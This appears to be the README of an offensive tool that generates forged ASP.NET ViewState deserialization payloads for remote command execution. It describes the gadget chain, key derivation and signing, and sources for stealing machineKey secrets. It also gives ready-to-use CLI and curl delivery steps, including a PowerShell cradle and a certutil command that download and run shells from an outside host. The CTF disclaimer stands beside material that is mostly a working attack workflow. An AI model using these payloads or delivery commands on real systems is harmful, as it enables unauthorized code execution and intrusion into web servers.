# fckyourserial

**A cross-platform ASP.NET ViewState deserialization payload generator — the ysoserial `TypeConfuseDelegate` gadget, rewritten in pure Python for CTF use.**

Tired of ysoserial's `.exe`-only workflow? `fckyourserial` runs anywhere Python 3.8+ runs — Linux, macOS, Windows, even a bare VNC'd Kali box — and produces a **signed + encrypted** `__VIEWSTATE` value that triggers `Process.Start("cmd.exe", "/c <your command>")` when deserialized by a vulnerable ASP.NET application.

> ⚠️ **For authorized security testing and CTF competitions only.** Forging ViewState against systems you do not own or have explicit permission to test is illegal in most jurisdictions.

---

## Table of Contents

1. [Features](#features)
2. [How it works](#how-it-works)
3. [Installation](#installation)
4. [Quick start](#quick-start)
5. [Usage / CLI reference](#usage--cli-reference)
6. [Getting the keys](#getting-the-keys)
7. [Legacy vs. modern (SP800-108) mode](#legacy-vs-modern-sp800-108-mode)
8. [Delivering the payload](#delivering-the-payload)
9. [Library usage](#library-usage)
10. [Project layout](#project-layout)
11. [Troubleshooting](#troubleshooting)
12. [FAQ](#faq)

---

## Features

- ✅ **Pure Python** — no Windows VM, no mono, no .NET runtime required
- ✅ **Full encryption + signing support** — AES-CBC (PKCS#7) + HMAC-SHA1
- ✅ **ASP.NET 4.5+ support** — implements the NIST **SP 800-108** counter-mode KDF (HMAC-SHA512) used by modern `machineKey` configurations
- ✅ **Legacy mode** — raw machineKey usage for pre-4.5 targets
- ✅ **Automatic VLQ fixup** — command substitution correctly updates both the string-length prefix and the outer `ObjectStateFormatter` stream length
- ✅ **PowerShell one-liner mode** — `-ps` auto-encodes your script as a UTF-16LE base64 `-enc` invocation
- ✅ **Multiple output formats** — base64, URL-encoded, or raw binary (`IV || CT || MAC`)
- ✅ **Importable as a library** — `generate_viewstate()` for your own tooling

---

## How it works

ASP.NET `ViewState` is a serialized object graph protected by keys from `<machineKey>` in `web.config` / `machine.config`. When `enableViewStateMac` validation is misconfigured, keys are leaked, or a **known/default key** is in use, an attacker can forge a fully valid ViewState.

`fckyourserial`:

1. Embeds an unsigned `ObjectStateFormatter` stream implementing the classic **TypeConfuseDelegate** chain:

   ```
   SortedSet<string>
     → ComparisonComparer<string>
       → DelegateSerializationHolder
         → Func<string, string, string> == Process.Start
   ```

   This abuses `Comparison<T>` delegate confusion to call
   `System.Diagnostics.Process.Start(String fileName, String arguments)`,
   where the arguments become `cmd.exe` and `/c <your command>`.

2. **Patches your command into the template at runtime**, recalculating:
   - the VLQ (variable-length quantity) length prefix of the replaced string
   - the outer stream-length VLQ after the `0xFF 0x01` header

3. **Derives the real keys** (unless `--legacy`):
   ```
   derived_key = SP800-108-CTR-HMACSHA512(machineKey, label, context, keybits)
   ```

4. **Encrypts** with AES-256-CBC (PKCS#7 padding) and **signs** with HMAC-SHA1 over `IV || ciphertext`, producing `IV || CT || MAC`, then base64-encodes the result.

The result is a byte-for-byte valid ViewState the target will deserialize — triggering command execution under the app pool identity.

---

## Installation

### Requirements

- Python **3.8+**
- [`pycryptodome`](https://pypi.org/project/pycryptodome/)

### From source

```bash
git clone https://github.com/yourname/fckyourserial.git
cd fckyourserial
pip install -r requirements.txt
```

### One-liner dependency install

```bash
pip install pycryptodome
```

### Verify it works

```bash
python3 -m fckyourserial "whoami"
```

You should see a `[*] command : whoami` banner followed by a long base64 blob.

---

## Quick start

```bash
# Simplest form (uses built-in demo keys — fine for CTFs with known keys)
python3 -m fckyourserial "whoami"

# PowerShell cradle
python3 -m fckyourserial -ps "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"

# Explicit keys, modern ASP.NET 4.5+ target
python3 -m fckyourserial \
  -vkey  DEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF \
  -ekey  CAFEBABECAFEBABECAFEBABECAFEBABECAFEBABECAFEBABECAFEBABECAFEBABE \
  "whoami > C:\Windows\Temp\pwned.txt"

# Pre-4.5 target (no SP800-108 derivation)
python3 -m fckyourserial -vkey <hex> -ekey <hex> --legacy "certutil -urlcache -f http://10.10.14.5/shell.exe C:\Windows\Temp\sh.exe"

# Save to file + emit URL-encoded version for direct form submission
python3 -m fckyourserial -o forged.b64 --urlencode "calc"
```

---

## Usage / CLI reference

```
usage: fckyourserial [-h] [-cmd STR | -ps SCRIPT | command]
                     [-vkey HEX] [-ekey HEX] [--purpose STR]
                     [--specific STR [STR ...]] [--legacy]
                     [-o FILE] [--urlencode] [--raw] [-q]
```

| Flag | Description |
|------|-------------|
| `command` (positional) | OS command to run via `cmd.exe /c <command>` |
| `-cmd STR` | Same as the positional argument (alternative form) |
| `-ps SCRIPT` | Wrap the given PowerShell script into `powershell -NoP -NonI -enc <base64>` automatically |
| `-vkey HEX` | **ValidationKey** from `machineKey` (hex). Defaults to a built-in demo key |
| `-ekey HEX` | **DecryptionKey** from `machineKey` (hex). Defaults to a built-in demo key |
| `--purpose STR` | Primary purpose string fed to SP800-108. Default: `WebForms.HiddenFieldPageStatePersister.ClientState` |
| `--specific STR [STR ...]` | Specific purpose strings. Default: `TemplateSourceDirectory: /`, `Type: System.Web.UI.Page` |
| `--legacy` | Skip SP800-108 derivation; use raw machineKey values (ASP.NET < 4.5) |
| `-o, --output FILE` | Write the generated payload to a file |
| `--urlencode` | Additionally print a URL-encoded version (ready for `__VIEWSTATE=` in a POST body) |
| `--raw` | Output raw binary `IV || CT || MAC` instead of base64 |
| `-q, --quiet` | Suppress the informational banner on stderr |

**Exit codes:** `0` on success, `1` on payload-generation failure, `2` on argument errors (argparse default).

---

## Getting the keys

You need the target's `ValidationKey` and `DecryptionKey`. Common CTF sources:

1. **Exposed `web.config`** — LFI, directory traversal, or misconfigured backups (`web.config.bak`, `web.config.old`).
2. **Known/default keys** — many CTF challenges use keys from the famous [machineKey lists](https://github.com/harmj0y/aspnet-machinekey). Try common sets with `--legacy` first.
3. **Padding oracle (CVE-2010-3332 / MS10-070)** — tools like `padbuster` can recover the keys.
4. **Source disclosure** — repo leaks, GitHub recon, misconfigured Git directories.
5. **`machine.config`** — machine-wide keys at `%WINDIR%\Microsoft.NET\Framework64\<ver>\CONFIG\machine.config`.

Example `machineKey` you might find:

```xml
<machineKey
  validationKey="DEADBEEF...DEADBEEF"
  decryptionKey="CAFEBABE...CAFEBABE"
  validation="SHA1"
  decryption="AES" />
```

Strip it down and feed only the hex to `-vkey` / `-ekey`.

> Key length note: keys of 40–64 bytes hex are typical. The tool derives keys of the **same bit length** as what you supply, matching ASP.NET behavior.

---

## Legacy vs. modern (SP800-108) mode

| ASP.NET version | Mode | Flag |
|-----------------|------|------|
| < 4.5 | Raw machineKey used directly | `--legacy` |
| ≥ 4.5 | Keys fed through SP800-108 CTR-HMAC-SHA512 KDF | *(default)* |

The KDF parameters default to:

- **label:** `WebForms.HiddenFieldPageStatePersister.ClientState`
- **context:** `TemplateSourceDirectory: /` + `Type: System.Web.UI.Page`

If the target app has a non-default app path or you're targeting a different persister (e.g., `LosFormatter` / session-state scenarios), adjust with `--purpose` and `--specific`. Getting the purpose strings wrong yields a valid-but-undecryptable blob — if your payload doesn't fire, this is the first thing to vary.

---

## Delivering the payload

### 1. Hidden form field (classic)

Grab the base64 from stdout and submit:

```bash
curl -X POST http://target/page.aspx \
  -d "__VIEWSTATE=$(cat forged.b64)" \
  --data-urlencode "__EVENTVALIDATION=whatever_the_page_expects"
```

### 2. Burp Suite

1. Intercept a normal POST containing `__VIEWSTATE`.
2. Replace its value with the generated payload.
3. Forward. Response timing/status usually hints at success (blind execution may show a 500 due to the deserialize exception — that's normal and expected with TypeConfuseDelegate).

### 3. URL-encoded inline

```bash
python3 -m fckyourserial --urlencode -q "whoami"
```

...and paste directly as `__VIEWSTATE=<urlencoded>` in your request.

### 4. Raw binary

For tools that accept the unprotected blob directly (e.g., some decryptors):

```bash
python3 -m fckyourserial --raw -o payload.bin "whoami"
```

---

## Library usage

```python
from fckyourserial import generate_viewstate

vs = generate_viewstate(
    "whoami",
    validation_key=bytes.fromhex("DEADBEEF..."),
    decryption_key=bytes.fromhex("CAFEBABE..."),
    # legacy=False,                  # set True for ASP.NET < 4.5
    # purpose="WebForms.HiddenFieldPageStatePersister.ClientState",
    # specific_purposes=["TemplateSourceDirectory: /", "Type: System.Web.UI.Page"],
)
print(vs)
```

Lower-level building blocks are exported too:

```python
from fckyourserial.crypto import sp800_108_derivekey, encrypt_and_sign
```

---

## Project layout

```
fckyourserial/
├── fckyourserial/
│   ├── __init__.py      # Public API exports (generate_viewstate, etc.)
│   ├── __main__.py      # Enables `python -m fckyourserial`
│   ├── cli.py           # Argument parsing & output handling
│   ├── crypto.py        # AES-CBC, HMAC-SHA1, SP800-108 KDF, VLQ helpers
│   ├── gadgets.py       # Embedded ObjectStateFormatter template + patching
│   └── ...
├── README.md
└── requirements.txt
```

---

## Troubleshooting

**`Missing dependency — run: pip install pycryptodome`**
Install it: `pip install pycryptodome`. If `Crypto` still isn't found, you likely have `pycryptodome` vs `pycryptodomex` conflicts — `pip uninstall pycrypto pycryptodomex` first, then reinstall.

**`embedded '/c ' command marker not found`**
The embedded template is corrupted. Re-download/restore the file.

**`unexpected multi-byte VLQ length for the original command`**
The template's command string exceeds 127 bytes — shouldn't happen with the stock template; check for accidental edits.

**`VLQ size drift after command patch`**
Your command is long enough to change the length of the length prefix itself. This is handled automatically up to very large commands; if you somehow hit it, shorten the command (use `-ps` with a staged dropper instead).

**Payload runs locally but not on target**
Check, in order:
1. Correct `--legacy` vs default mode for the target's .NET version
2. `--purpose` / `--specific` match the target's app path (leading `/` matters)
3. Keys are correct and full-length
4. Target actually uses `ObjectStateFormatter`-based ViewState (WebForms), not MVC TempData

**500 errors on submit**
Normal for this gadget — the deserialization exception fires *after* `Process.Start`. Check for out-of-band command results (DNS/HTTP callback, file drops).

---

## FAQ

**Q: Which ysoserial gadget is this equivalent to?**
A: `TypeConfuseDelegate` — the classic `SortedSet<string>` + `ComparisonComparer` + `Process.Start` chain.

**Q: Does it support `ViewStateUserKey`, MAC isolation, or `AspNetCryptoPurpose` variations?**
A: Purpose strings are fully configurable via `--purpose` / `--specific`, which covers most WebForms scenarios. Exotic configurations need manual parameter tuning.

**Q: Does it work on .NET Core / .NET 5+?**
A: ASP.NET Core does not use `ObjectStateFormatter` ViewState the same way; this targets classic .NET Framework WebForms.

**Q: Can I add more gadgets?**
A: Yes — `gadgets.py` is structured so each gadget template + patcher can live alongside the TypeConfuseDelegate one. PRs welcome.
